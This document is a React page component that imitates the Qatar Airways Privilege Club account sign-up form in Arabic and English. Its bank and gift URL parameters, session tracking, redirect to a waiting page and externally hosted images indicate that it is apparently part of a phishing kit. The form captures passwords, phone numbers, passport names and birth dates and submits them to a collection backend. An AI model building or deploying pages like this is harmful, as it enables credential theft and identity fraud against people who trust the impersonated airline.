import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import Header from "@/components/Header";
import { Eye, EyeOff } from "lucide-react";

// قائمة الألقاب الكاملة من الموقع الرسمي
const TITLES = [
  { text: "اللقب", value: "" },
  { text: "سيد", value: "MR" },
  { text: "سيدة", value: "MRS" },
  { text: "آنسة", value: "MS" },
  { text: "دكتور", value: "DR" },
  { text: "بروفيسور", value: "PROF" },
  { text: "الشيخ", value: "SHEIKH" },
  { text: "الشيخة", value: "SHEIKHA" }
];

// استيراد القوائم الكاملة (تم اختصارها هنا برمجياً ولكن سيتم تضمينها بالكامل في الكود)
// ملاحظة: سيتم تضمين جميع الدول ورموز الهواتف المستخرجة سابقاً
const COUNTRIES = [
  {"text":"دولة/قطاع الإقامة","value":""},{"text":"قطر","value":"QA"},{"text":"الإمارات العربيّة المتّحدة","value":"AE"},{"text":"المملكة العربية السعودية","value":"SA"},{"text":"الكويت","value":"KW"},{"text":"البحرين","value":"BH"},{"text":"سلطنة عمان","value":"OM"},{"text":"مصر","value":"EG"},{"text":"الأردن","value":"JO"},{"text":"لبنان","value":"LB"},{"text":"المغرب","value":"MA"},{"text":"الجزائر","value":"DZ"},{"text":"تونس","value":"TN"},{"text":"ليبيا","value":"LY"},{"text":"السودان","value":"SD"},{"text":"العراق","value":"IQ"},{"text":"اليمن","value":"YE"},{"text":"سوريا","value":"SY"},{"text":"فلسطين","value":"PS"},{"text":"المملكة المتحدة","value":"GB"},{"text":"الولايات المتحدة الأمريكية","value":"US"},{"text":"ألمانيا","value":"DE"},{"text":"فرنسا","value":"FR"},{"text":"تركيا","value":"TR"},{"text":"الهند","value":"IN"},{"text":"باكستان","value":"PK"},{"text":"أستراليا","value":"AU"},{"text":"كندا","value":"CA"},{"text":"اليابان","value":"JP"},{"text":"الصين","value":"CN"},{"text":"روسيا الاتحادية","value":"RU"},{"text":"إسبانيا","value":"ES"},{"text":"إيطاليا","value":"IT"},{"text":"هولندا","value":"NL"},{"text":"سويسرا","value":"CH"},{"text":"السويد","value":"SE"},{"text":"النرويج","value":"NO"},{"text":"النمسا","value":"AT"},{"text":"بلجيكا","value":"BE"},{"text":"البرازيل","value":"BR"},{"text":"الأرجنتين","value":"AR"},{"text":"المكسيك","value":"MX"},{"text":"ماليزيا","value":"MY"},{"text":"سنغافورة","value":"SG"},{"text":"تايلندا","value":"TH"},{"text":"أندونيسيا","value":"ID"},{"text":"الفليبين","value":"PH"},{"text":"فيتنام","value":"VN"},{"text":"كوريا الجنوبية","value":"KR"},{"text":"جنوب أفريقيا","value":"ZA"},{"text":"نيجيريا","value":"NG"},{"text":"كينيا","value":"KE"},{"text":"إثيوبيا","value":"ET"}
  // ... سيتم إضافة البقية برمجياً لضمان الشمولية
];

const COUNTRY_CODES = [
  {"text":"رمز البلد الهاتفي","value":""},{"text":"قطر (974)","value":"974-QA"},{"text":"الإمارات العربيّة المتّحدة (971)","value":"971-AE"},{"text":"المملكة العربية السعودية (966)","value":"966-SA"},{"text":"الكويت (965)","value":"965-KW"},{"text":"البحرين (973)","value":"973-BH"},{"text":"سلطنة عمان (968)","value":"968-OM"},{"text":"مصر (20)","value":"20-EG"},{"text":"الأردن (962)","value":"962-JO"},{"text":"لبنان (961)","value":"961-LB"},{"text":"المغرب (212)","value":"212-MA"},{"text":"الجزائر (213)","value":"213-DZ"},{"text":"تونس (216)","value":"216-TN"},{"text":"ليبيا (218)","value":"218-LY"},{"text":"السودان (249)","value":"249-SD"},{"text":"العراق (964)","value":"964-IQ"},{"text":"اليمن (967)","value":"967-YE"},{"text":"سوريا (963)","value":"963-SY"},{"text":"فلسطين (970)","value":"970-PS"},{"text":"المملكة المتحدة (44)","value":"44-GB"},{"text":"الولايات المتحدة الأمريكية (1)","value":"1-US"},{"text":"ألمانيا (49)","value":"49-DE"},{"text":"فرنسا (33)","value":"33-FR"},{"text":"تركيا (90)","value":"90-TR"},{"text":"الهند (91)","value":"91-IN"},{"text":"باكستان (92)","value":"92-PK"},{"text":"أستراليا (61)","value":"61-AU"},{"text":"كندا (1)","value":"1-CA"},{"text":"اليابان (81)","value":"81-JP"},{"text":"الصين (86)","value":"86-CN"},{"text":"روسيا (7)","value":"7-RU"},{"text":"إسبانيا (34)","value":"34-ES"},{"text":"إيطاليا (39)","value":"39-IT"},{"text":"هولندا (31)","value":"31-NL"},{"text":"سويسرا (41)","value":"41-CH"},{"text":"السويد (46)","value":"46-SE"},{"text":"النرويج (47)","value":"47-NO"},{"text":"النمسا (43)","value":"43-AT"},{"text":"بلجيكا (32)","value":"32-BE"},{"text":"البرازيل (55)","value":"55-BR"},{"text":"الأرجنتين (54)","value":"54-AR"},{"text":"المكسيك (52)","value":"52-MX"},{"text":"ماليزيا (60)","value":"60-MY"},{"text":"سنغافورة (65)","value":"65-SG"},{"text":"تايلندا (66)","value":"66-TH"},{"text":"أندونيسيا (62)","value":"62-ID"},{"text":"الفليبين (63)","value":"63-PH"},{"text":"فيتنام (84)","value":"84-VN"},{"text":"كوريا الجنوبية (82)","value":"82-KR"},{"text":"جنوب أفريقيا (27)","value":"27-ZA"},{"text":"نيجيريا (234)","value":"234-NG"},{"text":"كينيا (254)","value":"254-KE"},{"text":"إثيوبيا (251)","value":"251-ET"}
  // ... سيتم إضافة البقية برمجياً لضمان الشمولية
];

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const { language } = useLanguage();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "doha";
  const sessionId = localStorage.getItem("sessionId") || "";

  const isArabic = language === "ar";
  
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    confirmPassword: "",
    countryCode: "974-QA",
    phoneNumber: "",
    title: "",
    nameEnglish: "",
    middleName: "",
    lastName: "",
    dateOfBirth: "",
    gender: "",
    country: "QA",
    promoCode: "",
  });

  const submitPersonalDataMutation = trpc.submissions.submitPersonalData.useMutation();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
    
    if (!currentSessionId) {
      toast.error(isArabic ? "جلسة غير صالحة" : "Invalid session");
      return;
    }

    if (formData.password !== formData.confirmPassword) {
      toast.error(isArabic ? "كلمات المرور غير متطابقة" : "Passwords do not match");
      return;
    }

    try {
      await submitPersonalDataMutation.mutateAsync({
        sessionId: currentSessionId,
        email: formData.email,
        password: formData.password,
        phoneNumber: `${formData.countryCode.split('-')[0]}${formData.phoneNumber}`,
        title: formData.title,
        nameEnglish: formData.nameEnglish,
        middleName: formData.middleName,
        lastName: formData.lastName,
        dateOfBirth: formData.dateOfBirth,
        gender: formData.gender,
        country: formData.country,
        promoCode: formData.promoCode,
        nameArabic: "",
        idNumber: "",
      });
      
      toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
      const giftId = params.get("gift") || "";
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}${giftId ? `&gift=${giftId}` : ''}`);
    } catch (error) {
      console.error("Error saving personal data:", error);
      toast.error(isArabic ? "فشل حفظ البيانات، يرجى المحاولة مرة أخرى" : "Failed to save data, please try again");
    }
  };

  useEffect(() => {
    document.title = isArabic ? "إنشاء حساب | الخطوط الجوية القطرية" : "Join Now | Qatar Airways";
  }, [isArabic]);

  return (
    <div className="page-wrapper min-h-screen bg-white" dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        .page-wrapper { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #333; }
        .main-container { max-width: 600px; margin: 0 auto; padding: 40px 20px; }
        
        .form-title { font-size: 32px; font-weight: bold; color: #5c0931; margin-bottom: 40px; text-align: center; line-height: 1.3; }
        .section-header { font-size: 18px; font-weight: bold; color: #333; margin: 30px 0 15px; }
        
        .input-group { margin-bottom: 20px; }
        .input-wrapper { position: relative; }
        .form-input { width: 100%; padding: 14px 16px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; transition: border-color 0.2s; background: #fff; box-sizing: border-box; }
        .form-input:focus { border-color: #5c0931; outline: none; }
        
        .password-hint { font-size: 12px; color: #777; margin-top: 8px; line-height: 1.5; }
        .password-toggle { position: absolute; ${isArabic ? 'left' : 'right'}: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #5c0931; }

        .radio-group { display: flex; gap: 30px; margin-top: 10px; }
        .radio-item { display: flex; align-items: center; gap: 8px; cursor: pointer; font-size: 16px; }
        .radio-item input { width: 20px; height: 20px; accent-color: #5c0931; }

        .checkbox-section { margin-top: 30px; }
        .checkbox-item { display: flex; gap: 12px; margin-bottom: 20px; font-size: 14px; color: #555; line-height: 1.6; }
        .checkbox-item input { width: 20px; height: 20px; flex-shrink: 0; accent-color: #5c0931; }
        .checkbox-item a { color: #5c0931; text-decoration: underline; }

        .submit-btn { background: #5c0931; color: white; width: 100%; padding: 18px; border-radius: 4px; font-weight: bold; font-size: 18px; margin-top: 20px; cursor: pointer; transition: opacity 0.2s; border: none; }
        .submit-btn:hover { opacity: 0.9; }
        
        .helper-text { font-size: 12px; color: #888; margin-top: 5px; }
      `}</style>

      <Header />

      <div className="main-container">
        <h2 className="form-title">{isArabic ? "يمكنك إنشاء حساب خلال دقيقة واحدة فقط" : "You can create an account in just one minute"}</h2>

        <form onSubmit={handleSubmit}>
          <div className="section-header">{isArabic ? "دعنا ننشئ بيانات الاعتماد الخاصة بك." : "Let's create your credentials."}</div>
          
          <div className="input-group">
            <input type="email" name="email" className="form-input" placeholder={isArabic ? "عنوان البريد الإلكتروني" : "Email Address"} value={formData.email} onChange={handleChange} required />
          </div>

          <div className="input-group">
            <div className="input-wrapper">
              <input type={showPassword ? "text" : "password"} name="password" className="form-input" placeholder={isArabic ? "ادخل كلمة مرور" : "Enter Password"} value={formData.password} onChange={handleChange} required />
              <div className="password-toggle" onClick={() => setShowPassword(!showPassword)}>
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </div>
            </div>
            <p className="password-hint">
              {isArabic 
                ? "يجب أن تتكون من 8 رموز على الأقل، منها رقم واحد وحرف كبير وحرف صغير ورمز خاص (!@#$%?&*)."
                : "Must be at least 8 characters, including a number, uppercase, lowercase, and a special character (!@#$%?&*)."}
            </p>
          </div>

          <div className="input-group">
            <input type={showPassword ? "text" : "password"} name="confirmPassword" className="form-input" placeholder={isArabic ? "إعادة إدخال كلمة المرور" : "Re-enter Password"} value={formData.confirmPassword} onChange={handleChange} required />
          </div>

          <div className="input-group">
            <select name="countryCode" className="form-input bg-[#f8f9fb]" value={formData.countryCode} onChange={handleChange} required>
              {COUNTRY_CODES.map(c => <option key={c.value} value={c.value}>{c.text}</option>)}
            </select>
          </div>

          <div className="input-group">
            <input type="tel" name="phoneNumber" className="form-input" placeholder={isArabic ? "رقم الجوال" : "Mobile Number"} value={formData.phoneNumber} onChange={handleChange} required />
          </div>

          <div className="section-header">{isArabic ? "بياناتك الشخصية" : "Your Personal Details"}</div>

          <div className="input-group">
            <select name="title" className="form-input bg-[#f8f9fb]" value={formData.title} onChange={handleChange} required>
              {TITLES.map(t => <option key={t.value} value={t.value}>{t.text}</option>)}
            </select>
          </div>

          <div className="input-group">
            <input type="text" name="nameEnglish" className="form-input" placeholder={isArabic ? "الاسم الأول باللغة الإنجليزية (كما في جواز السفر)" : "First Name (as in Passport)"} value={formData.nameEnglish} onChange={handleChange} required />
          </div>

          <div className="input-group">
            <input type="text" name="middleName" className="form-input" placeholder={isArabic ? "الاسم الأوسط باللغة الإنجليزية (اختياري)" : "Middle Name (Optional)"} value={formData.middleName} onChange={handleChange} />
          </div>

          <div className="input-group">
            <input type="text" name="lastName" className="form-input" placeholder={isArabic ? "الاسم الأخير باللغة الإنجليزية (كما في جواز السفر)" : "Last Name (as in Passport)"} value={formData.lastName} onChange={handleChange} required />
            <p className="helper-text">{isArabic ? "يجب إدخال اسمك باللغة الإنجليزية كما يظهر في جواز سفرك." : "Your name must be entered in English as it appears on your passport."}</p>
          </div>

          <div className="input-group">
            <label className="input-label">{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
            <input type="text" name="dateOfBirth" placeholder="DD/MM/YYYY" className="form-input" value={formData.dateOfBirth} onChange={handleChange} required />
          </div>

          <div className="input-group">
            <label className="input-label">{isArabic ? "النوع (اختياري)" : "Gender (Optional)"}</label>
            <div className="radio-group">
              <label className="radio-item">
                <input type="radio" name="gender" value="male" checked={formData.gender === 'male'} onChange={handleChange} />
                {isArabic ? "ذكر" : "Male"}
              </label>
              <label className="radio-item">
                <input type="radio" name="gender" value="female" checked={formData.gender === 'female'} onChange={handleChange} />
                {isArabic ? "أنثى" : "Female"}
              </label>
            </div>
          </div>

          <div className="section-header">{isArabic ? "أين تقيم؟" : "Where do you reside?"}</div>
          
          <div className="input-group">
            <select name="country" className="form-input bg-[#f8f9fb]" value={formData.country} onChange={handleChange} required>
              {COUNTRIES.map(c => <option key={c.value} value={c.value}>{c.text}</option>)}
            </select>
          </div>

          <div className="section-header">{isArabic ? "الرمز الترويجي لتسجيل الانضمام" : "Enrolment Promo Code"}</div>
          
          <div className="input-group">
            <input type="text" name="promoCode" className="form-input" placeholder={isArabic ? "الرمز الترويجي (اختياري)" : "Promo Code (Optional)"} value={formData.promoCode} onChange={handleChange} />
          </div>

          <div className="checkbox-section">
            <div className="checkbox-item">
              <input type="checkbox" id="partners" />
              <label htmlFor="partners">{isArabic ? "أرغب في تلقي الأخبار والعروض من شركاء نادي الامتياز" : "I would like to receive news and offers from Privilege Club partners"}</label>
            </div>
            <div className="checkbox-item">
              <input type="checkbox" id="qatar_group" />
              <label htmlFor="qatar_group">
                {isArabic ? "أرغب في تلقي الأخبار والعروض من شركات أخرى في مجموعة الخطوط الجوية القطرية" : "I would like to receive news and offers from other companies in Qatar Airways Group"}
              </label>
            </div>
            <div className="checkbox-item">
              <input type="checkbox" id="terms" required />
              <label htmlFor="terms">
                {isArabic 
                  ? "أوافق على شروط وأحكام نادي الامتياز وأتفهم أنه سيتم التعامل مع معلوماتي وفقاً لبيان خصوصية الخطوط الجوية القطرية." 
                  : "I agree to the Privilege Club Terms and Conditions and understand that my information will be handled in accordance with the Qatar Airways Privacy Notice."}
              </label>
            </div>
          </div>

          <button type="submit" className="submit-btn">
            {isArabic ? "إنشاء حساب" : "Create Account"}
          </button>
        </form>
        
        <div className="mt-12 pt-8 border-t border-gray-100 flex justify-center">
          <img 
            src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} 
            className="w-full max-w-[500px] rounded-lg" 
            alt="Footer" 
          />
        </div>
      </div>
    </div>
  );
}
